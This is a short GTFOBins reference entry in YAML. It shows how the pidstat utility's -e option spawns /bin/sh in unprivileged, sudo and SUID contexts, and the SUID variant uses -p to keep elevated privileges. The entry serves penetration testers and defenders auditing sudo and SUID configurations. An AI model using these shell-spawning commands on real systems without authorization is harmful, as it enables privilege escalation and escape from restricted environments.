<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/pidstat -->
---
functions:
  shell:
  - code: |-
      pidstat -e /bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          pidstat -e /bin/sh -p
        shell: false
      unprivileged:
...
